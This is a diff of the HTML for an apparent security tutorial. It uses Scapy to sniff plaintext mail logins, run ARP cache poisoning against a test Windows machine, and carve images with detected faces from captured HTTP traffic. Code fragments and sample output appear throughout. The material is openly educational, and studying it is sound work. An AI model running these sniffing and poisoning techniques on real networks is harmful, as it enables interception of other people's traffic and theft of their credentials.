         &lt;span class="n"&gt;mail_packet&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;packet&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;TCP&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
         &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;user&amp;#39;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;mail_packet&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;lower&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="ow"&gt;or&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;pass&amp;#39;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;mail_packet&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;lower&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
-            &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;[*] Server: &amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;packet&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;IP&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;dst&lt;/span&gt;
-            &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;[*] &amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;packet&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;TCP&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;payload&lt;/span&gt;
+            &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;[*] Server: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;packet&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;IP&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;dst&lt;/span&gt;
+            &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;[*] &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="n"&gt;packet&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;TCP&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;payload&lt;/span&gt;
 
 &lt;span class="n"&gt;sniff&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;filter&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;tcp port 110 or tcp port 25 or tcp port 143&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;prn&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;packet_callback&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;store&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;Running this script when loading  some mail client (such as &lt;a href="https://www.mozilla.org/en-US/thunderbird/"&gt;Thunderbird&lt;/a&gt;) will allow us to see the login information (useful if they are sent to the server as plain text).&lt;/p&gt;
+&lt;p&gt;Running this script when loading load some mail client (such as &lt;a href="https://www.mozilla.org/en-US/thunderbird/"&gt;Thunderbird&lt;/a&gt;) will allow us to see the login information, if they are sent to the server as plain text.&lt;/p&gt;
 &lt;hr /&gt;
 &lt;h2&gt;&lt;a name="arp"&gt;&lt;/a&gt; ARP Cache Poisoning&lt;/h2&gt;
 &lt;p&gt;I talked about &lt;a href="http://bt3gl.github.io/wiresharking-for-fun-or-profit.html"&gt;ARP cache poisoning using command line arpspoof&lt;/a&gt; in my guide about Wireshark. Here we are going to see how to implement similar tool using Scapy.&lt;/p&gt;
 &lt;p&gt;ARP cache poisoning works by convincing a target machine that we are the gateway, and then convincing the gateway that all traffic should pass through our machine.&lt;/p&gt;
 &lt;p&gt;Every machine in a network maintains an ARP cache that stores the recent MAC addresses that match to IP addresses on the local network. All we need to do is to poison this cache with controlled entries.&lt;/p&gt;
-&lt;p&gt;The best way to test this is using a Windows virtual machine. Before the attack, go to the Windows box, open the terminal (&lt;code&gt;cmd&lt;/code&gt;) and check the IP and gateway IP address with&lt;code&gt;ipconfig&lt;/code&gt;. Then check the associated  ARP cache entry MAC address with &lt;code&gt;arp -a&lt;/code&gt;:&lt;/p&gt;
+&lt;p&gt;The best way to test this is using a Windows virtual machine (take a look in &lt;a href="http://bt3gl.github.io/setting-up-a-playing-environment-with-virtual-machines.html"&gt;this guide I wrote&lt;/a&gt;).&lt;/p&gt;
+&lt;p&gt;Before the attack, go to the Windows box, open the terminal (&lt;code&gt;cmd&lt;/code&gt;) and check the IP and gateway IP address with&lt;code&gt;ipconfig&lt;/code&gt;. Then check the associated  ARP cache entry MAC address with &lt;code&gt;arp -a&lt;/code&gt;. We are going to use the former information and we will see the ARP data being changed:&lt;/p&gt;
 &lt;p&gt;&lt;img alt="" src="http://i.imgur.com/ME069uS.png" /&gt;&lt;/p&gt;
-&lt;p&gt;Our ARP poisoning script (based on &lt;a href="http://www.nostarch.com/blackhatpython"&gt;Black Hat Python&lt;/a&gt;) will perform the following steps:&lt;/p&gt;
+&lt;p&gt;Following is our ARP poisoning script (based on &lt;a href="http://www.nostarch.com/blackhatpython"&gt;Black Hat Python&lt;/a&gt;). The script does the following steps:&lt;/p&gt;
 &lt;ol&gt;
 &lt;li&gt;
 &lt;p&gt;Define constant values, set our interface card, and turn off output.&lt;/p&gt;
 &lt;/li&gt;
 &lt;li&gt;
-&lt;p&gt;Resolve the gateway and target MAC address. The function &lt;strong&gt;get_mac&lt;/strong&gt; use the &lt;strong&gt;srp&lt;/strong&gt; method to emit an ARP request to an IP address to resolve the MAC address.&lt;/p&gt;
+&lt;p&gt;Resolve the gateway and target MAC address.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;The function &lt;strong&gt;get_mac&lt;/strong&gt; use the &lt;strong&gt;srp&lt;/strong&gt; method to emit an ARP request to an IP address to resolve the MAC address.&lt;/li&gt;
+&lt;/ul&gt;
 &lt;/li&gt;
 &lt;li&gt;
-&lt;p&gt;Start the poison thread to perform the ARP poisoning attack. This will start the sniffer that captures the packets. The function &lt;strong&gt;poison_target&lt;/strong&gt; builds ARP requests for poisoning both the target IP and the gateway (in a loop).&lt;/p&gt;
+&lt;p&gt;Start the poison thread to perform the ARP poisoning attack. This will start the sniffer that captures the packets.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;The function &lt;strong&gt;poison_target&lt;/strong&gt; builds ARP requests for poisoning both the target IP and the gateway (in a loop).&lt;/li&gt;
+&lt;/ul&gt;
 &lt;/li&gt;
 &lt;li&gt;
-&lt;p&gt;Write out the captured packets and restore the network. The function &lt;strong&gt;restore_target&lt;/strong&gt; sends out the ARP packets to the network broadcast address to reset the ARP caches of the gateway and target machines.&lt;/p&gt;
+&lt;p&gt;Write out the captured packets and restore the network.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;The function &lt;strong&gt;restore_target&lt;/strong&gt; sends out the ARP packets to the network broadcast address to reset the ARP caches of the gateway and target machines.&lt;/li&gt;
+&lt;/ul&gt;
 &lt;/li&gt;
 &lt;/ol&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;scapy.all&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;
@@ -525,8 +455,8 @@ WARNING: No route found &lt;span class="k"&gt;for &lt;/span&gt;IPv6 destination 
         &lt;span class="k"&gt;except&lt;/span&gt; &lt;span class="ne"&gt;KeyboardInterrupt&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
             &lt;span class="n"&gt;restore_target&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gateway_ip&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;gateway_mac&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;target_ip&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;target_mac&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 
-    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;[*] ARP poison attack finished.&amp;#39;&lt;/span&gt;
-    &lt;span class="k"&gt;return&lt;/span&gt;
+        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;[*] ARP poison attack finished.&amp;#39;&lt;/span&gt;
+        &lt;span class="k"&gt;return&lt;/span&gt;
 
 &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
     &lt;span class="n"&gt;conf&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;iface&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;INTERFACE&lt;/span&gt;
@@ -566,30 +496,30 @@ WARNING: No route found &lt;span class="k"&gt;for &lt;/span&gt;IPv6 destination 
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;To run this ARP cache poisoning script, we need to tell the local host machine (Kali Linux) to forward packets along both the gateway and the target IP address:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;&lt;span class="nb"&gt;echo &lt;/span&gt;1 /proc/sys/net/ipv4/ip_foward
+&lt;p&gt;To run it, we need to tell the local host machine (Kali Linux) to forward packets along both the gateway and the target IP address:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;&lt;span class="nb"&gt;echo &lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; /proc/sys/net/ipv4/ip_foward
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;Finally, we run out script, which prints the following output:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;sudo&lt;/span&gt; &lt;span class="n"&gt;python&lt;/span&gt; &lt;span class="n"&gt;arp_cache_poisoning&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;py&lt;/span&gt;
-&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="n"&gt;Setting&lt;/span&gt; &lt;span class="n"&gt;up&lt;/span&gt; &lt;span class="n"&gt;wlp1s0&lt;/span&gt;
-&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="n"&gt;Gateway&lt;/span&gt; &lt;span class="mf"&gt;192.168.1.1&lt;/span&gt; &lt;span class="n"&gt;is&lt;/span&gt; &lt;span class="n"&gt;at&lt;/span&gt; &lt;span class="mo"&gt;00&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;90&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;a9&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;a3&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;f1&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;46&lt;/span&gt;
-&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="n"&gt;Target&lt;/span&gt; &lt;span class="mf"&gt;192.168.1.107&lt;/span&gt; &lt;span class="n"&gt;is&lt;/span&gt; &lt;span class="n"&gt;at&lt;/span&gt; &lt;span class="mo"&gt;00&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;25&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;b3&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;87&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;c4&lt;/span&gt;
-&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="n"&gt;Beginning&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;ARP&lt;/span&gt; &lt;span class="n"&gt;poison&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;CTRL&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;C&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;stop&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
-&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="n"&gt;Starting&lt;/span&gt; &lt;span class="n"&gt;sniffer&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="mi"&gt;1000&lt;/span&gt; &lt;span class="n"&gt;packets&lt;/span&gt;
-&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="n"&gt;ARP&lt;/span&gt; &lt;span class="n"&gt;poison&lt;/span&gt; &lt;span class="n"&gt;attack&lt;/span&gt; &lt;span class="n"&gt;finished&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;
-&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="n"&gt;Restoring&lt;/span&gt; &lt;span class="n"&gt;targets&lt;/span&gt;&lt;span class="p"&gt;...&lt;/span&gt;
+&lt;p&gt;Running this in our attack machine (Kali Linux),&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;sudo python arp_cache_poisoning.py
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Setting up wlp1s0
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Gateway 192.168.1.1 is at 00:90:a9:a3:f1:46
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Target 192.168.1.107 is at 00:25:9c:b3:87:c4
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Beginning the ARP poison. &lt;span class="o"&gt;[&lt;/span&gt;CTRL-C to stop&lt;span class="o"&gt;]&lt;/span&gt;
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Starting sniffer &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="m"&gt;1000&lt;/span&gt; packets
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; ARP poison attack finished.
+&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Restoring targets...
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;While running that, we can see the changes in the victim's machine (Windows):&lt;/p&gt;
+&lt;p&gt;we see the changes in the victim's machine (Windows):&lt;/p&gt;
 &lt;p&gt;&lt;img alt="" src="http://i.imgur.com/RFdIz4H.png" /&gt;&lt;/p&gt;
-&lt;p&gt;Once you are done,  open the PCAP file resulting from the script. BAM! The entire traffic from the victim is in your hand!&lt;/p&gt;
+&lt;p&gt;Now open in Wireshark the PCAP file resulting from the script. BAM! The entire traffic from the victim is in your hand!&lt;/p&gt;
 &lt;hr /&gt;
 &lt;h2&gt;&lt;a name="pcap"&gt;&lt;/a&gt; PCAP Processing to Find Images&lt;/h2&gt;
 &lt;p&gt;We have learned how to steal credentials from some email protocols, now let us extend this to all the traffic in the network!&lt;/p&gt;
-&lt;h3&gt;The PCAP Files Manipulation&lt;/h3&gt;
+&lt;h3&gt;Writing and Saving PCAP Files&lt;/h3&gt;
 &lt;p&gt;To save packets we can use the function &lt;strong&gt;wrpacp&lt;/strong&gt;:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;wrpcap&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;packets.pcap&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
@@ -601,7 +531,7 @@ WARNING: No route found &lt;span class="k"&gt;for &lt;/span&gt;IPv6 destination 
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;h3&gt;Setting up the Environment&lt;/h3&gt;
+&lt;h3&gt;Analyzing PCAP Files&lt;/h3&gt;
 &lt;p&gt;Based in one of the examples from &lt;a href=""&gt;Black Hat Python&lt;/a&gt; we are going to analyze images from HTTP traffic dumped in a PCAP file. We can do this with the library &lt;a href="http://opencv.org/"&gt;opencv&lt;/a&gt;. We also need to install &lt;a href="http://www.numpy.org/"&gt;numpy&lt;/a&gt; and &lt;a href="http://www.scipy.org/"&gt;scipy&lt;/a&gt;:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;sudo pip install numpy
 &lt;span class="nv"&gt;$ &lt;/span&gt;sudo pip install scipy
@@ -609,11 +539,10 @@ WARNING: No route found &lt;span class="k"&gt;for &lt;/span&gt;IPv6 destination 
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;We are going to go through a script that tries to detect image with human faces. But, first, either create or download a PCAP file with these images. For instance, these are some PCAP dump online sources:
+&lt;p&gt;To try to detect images that contain human faces, first either create or download some PCAP files with these images. Some dump sources:
 &lt;a href="http://wiki.wireshark.org/SampleCaptures"&gt;here&lt;/a&gt;, &lt;a href="http://www.netresec.com/?page=PcapFiles"&gt;here&lt;/a&gt;, &lt;a href="http://www.pcapr.net/home"&gt;here&lt;/a&gt;, and &lt;a href="http://www.pcapr.net/browse?q=facebook+AND+png"&gt;here&lt;/a&gt;.&lt;/p&gt;
-&lt;h3&gt;Analyzing PCAP Files&lt;/h3&gt;
-&lt;p&gt;Now we are ready to automatically find human faces from HTTP traffic dump. Our  script basically does the following:&lt;/p&gt;
-&lt;p&gt;1) The function &lt;strong&gt;http_assembler&lt;/strong&gt; takes a PCAP and separates each TCP session in a dictionary. Then it loops in these sections using the HTTP filter (which is the same as &lt;em&gt;Follow the TCP stream&lt;/em&gt; in Wireshark). After the HTTP data is assembled, the headers are parsed with the &lt;strong&gt;get_http_headers&lt;/strong&gt; function and sent to the &lt;strong&gt;extract_image&lt;/strong&gt; function. If  image headers are returned, they are saved and sent to the function &lt;strong&gt;face_detect&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;The following script does the following:&lt;/p&gt;
+&lt;p&gt;1) The function &lt;strong&gt;http_assembler&lt;/strong&gt; takes a PCAP and separates each TCP session in a dictionary. Then it loops in these section using the HTTP filter (which is the same as &lt;em&gt;Follow the TCP stream&lt;/em&gt; in Wireshark). After the HTTP data is assembled, it parses the headers with the &lt;strong&gt;get_http_headers&lt;/strong&gt; function and send to the &lt;strong&gt;extract_image&lt;/strong&gt; function. If the image header are returned, it saves the image and try to detect faces with the function &lt;strong&gt;face_detect&lt;/strong&gt;.&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;http_assembler&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PCAP&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
     &lt;span class="n"&gt;carved_images&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;faces_detected&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
     &lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;rdpcap&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PCAP&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
@@ -630,6 +559,8 @@ WARNING: No route found &lt;span class="k"&gt;for &lt;/span&gt;IPv6 destination 
             &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;headers&lt;/span&gt; &lt;span class="ow"&gt;is&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                 &lt;span class="k"&gt;continue&lt;/span&gt;
 
+            &lt;span class="c"&gt;# extract the raw image and return the image type and the binary body of&lt;/span&gt;
+            &lt;span class="c"&gt;# the image itself&lt;/span&gt;
             &lt;span class="n"&gt;image&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;image_type&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;extract_image&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;headers&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;http_payload&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
             &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;image&lt;/span&gt; &lt;span class="ow"&gt;is&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="n"&gt;image_type&lt;/span&gt; &lt;span class="ow"&gt;is&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                 &lt;span class="n"&gt;file_name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;-pic_carver_&lt;/span&gt;&lt;span class="si"&gt;%d&lt;/span&gt;&lt;span class="s"&gt;.&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PCAP&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;carved_images&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;image_type&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
@@ -647,7 +578,9 @@ WARNING: No route found &lt;span class="k"&gt;for &lt;/span&gt;IPv6 destination 
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;2) The &lt;strong&gt;get_http_headers&lt;/strong&gt; function splits the headers using regex to find &lt;strong&gt;'Content-Type'&lt;/strong&gt;:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;The &lt;strong&gt;get_http_headers&lt;/strong&gt; function split the headers using regex to find &lt;strong&gt;'Content-Type'&lt;/strong&gt;:&lt;/li&gt;
+&lt;/ol&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;get_http_headers&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;http_payload&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
     &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
         &lt;span class="n"&gt;headers_raw&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;http_payload&lt;/span&gt;&lt;span class="p"&gt;[:&lt;/span&gt;&lt;span class="n"&gt;http_payload&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;index&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\r\n\r\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
@@ -660,7 +593,9 @@ WARNING: No route found &lt;span class="k"&gt;for &lt;/span&gt;IPv6 destination 
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;3) The &lt;strong&gt;extract_image&lt;/strong&gt; extract the data part from the HTTP content, decompressing it if necessary:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;The &lt;strong&gt;extract_image&lt;/strong&gt; function determine whether an image is in a HTTP response by checking by the &lt;strong&gt;'Content-Type'&lt;/strong&gt; string.&lt;/li&gt;
+&lt;/ol&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;extract_image&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;headers&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;http_payload&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
     &lt;span class="n"&gt;image&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;image_type&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;
     &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
@@ -681,10 +616,12 @@ WARNING: No route found &lt;span class="k"&gt;for &lt;/span&gt;IPv6 destination 
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;4) Finally, the &lt;strong&gt;face_detect&lt;/strong&gt; function uses the &lt;strong&gt;opencv&lt;/strong&gt; library to apply a classifier that is trained for detecting faces. It returns a rectangle coordinates to where the face is and saves the final image (by the way, beyond face detection, other types of image classifiers can be found &lt;a href="http://alereimondo.no-ip.org/OpenCV/34"&gt;here&lt;/a&gt;):&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Finally, the &lt;strong&gt;face_detect&lt;/strong&gt; function uses the &lt;strong&gt;opencv&lt;/strong&gt; library to apply a classifier that is trained for detecting faces. It returns a rectangle coordinates to where the face is and saves the final image. Several types of image classifiers can be found &lt;a href="http://alereimondo.no-ip.org/OpenCV/34"&gt;here&lt;/a&gt;.&lt;/li&gt;
+&lt;/ol&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;face_detect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;file_name&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
